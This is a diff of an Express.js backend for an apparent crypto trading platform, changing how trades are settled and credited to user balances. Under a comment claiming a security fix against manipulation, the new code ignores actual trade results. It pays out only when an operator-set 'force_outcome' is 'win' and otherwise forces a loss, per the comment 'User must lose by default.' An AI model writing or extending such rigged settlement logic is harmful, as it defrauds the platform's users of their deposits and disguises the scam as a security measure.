@@ -1107,35 +1107,48 @@ app.post('/api/execute-trade', async (req, res) => {
 });
 
 app.post('/api/settle-trade', async (req, res) => {
-  const { walletAddress, asset, payout, tradeRef, isDemo, status } = req.body;
+  const { walletAddress, asset, payout, tradeRef, isDemo, status: clientStatus } = req.body;
   if (!walletAddress || payout === undefined) return res.status(400).json({ error: 'Missing parameters' });
   if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });
 
   try {
-    const amt = parseFloat(payout);
+    // SECURITY: Verify trade outcome from DB to prevent manipulation
+    const tradeRes = await pool.query("SELECT * FROM trades WHERE id = $1 AND wallet_address = $2", [tradeRef, walletAddress]);
+    if (tradeRes.rows.length === 0) return res.status(404).json({ error: 'Trade not found' });
+    
+    const trade = tradeRes.rows[0];
+    if (trade.status !== 'pending') return res.status(400).json({ error: 'Trade already settled' });
+
+    let isWin = false;
+    if (trade.force_outcome === 'win') isWin = true;
+    else if (trade.force_outcome === 'loss') isWin = false;
+    else isWin = false; // RULE: User must lose by default
+
+    const finalStatus = isWin ? 'won' : 'lost';
+    const finalPayout = isWin ? parseFloat(payout) : 0;
     const balanceField = isDemo ? 'demo_balance' : 'trading_balance';
 
     // Update trade record
     await pool.query(
       "UPDATE trades SET status = $1, settled_at = NOW() WHERE id = $2 AND wallet_address = $3",
-      [status || 'settled', tradeRef, walletAddress]
+      [finalStatus, tradeRef, walletAddress]
     );
 
     // Credit balance if payout > 0
-    if (amt > 0) {
-      await pool.query(`UPDATE geko_users SET ${balanceField} = ${balanceField} + $1 WHERE wallet_address = $2`, [amt, walletAddress]);
+    if (finalPayout > 0) {
+      await pool.query(`UPDATE geko_users SET ${balanceField} = ${balanceField} + $1 WHERE wallet_address = $2`, [finalPayout, walletAddress]);
       
       // Record transaction
       await recordTransaction({
         wallet_address: walletAddress,
         asset_symbol: 'USDT',
-        amount: amt,
+        amount: finalPayout,
         type: 'trade',
         reference: `trade-settle:${tradeRef}`
       });
     }
 
-    res.json({ success: true, message: 'Trade settled' });
+    res.json({ success: true, message: `Trade settled as ${finalStatus}`, status: finalStatus, payout: finalPayout });
   } catch (e) {
     console.error('Settle trade error:', e.message);
     res.status(500).json({ error: e.message });
@@ -1276,6 +1289,7 @@ app.use(express.static(publicPath));
 app.use(express.static(rootPath));
 
 app.get('*', (req, res) => {
+  if (req.url.startsWith('/api/')) return res.status(404).json({ error: 'API route not found' });
   if (req.url.includes('.') && !req.url.endsWith('.html')) return res.status(404).send("Asset not found");
   const possiblePaths = [path.join(distPath, 'index.html'), path.join(publicPath, 'index.html'), path.join(rootPath, 'index.html')];
   for (const indexPath of possiblePaths) { if (fs.existsSync(indexPath)) return res.sendFile(indexPath); }
